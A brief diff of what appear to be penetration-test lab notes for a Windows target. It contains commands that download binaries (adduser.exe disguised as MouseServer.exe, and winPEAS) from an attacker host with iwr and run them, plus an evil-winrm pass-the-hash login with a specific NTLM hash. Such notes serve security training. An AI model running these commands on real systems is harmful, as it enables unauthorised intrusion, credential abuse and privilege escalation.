@@ -297,4 +297,7 @@ iwr -uri http://192.168.45.219/adduser.exe -Outfile MouseServer.exe
 .142
 ```
 evil-winrm -i 10.10.115.142 -u celia.almeda -H "e728ecbadfb02f51ce8eed753f3ff3fd"
+
+iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
 ```
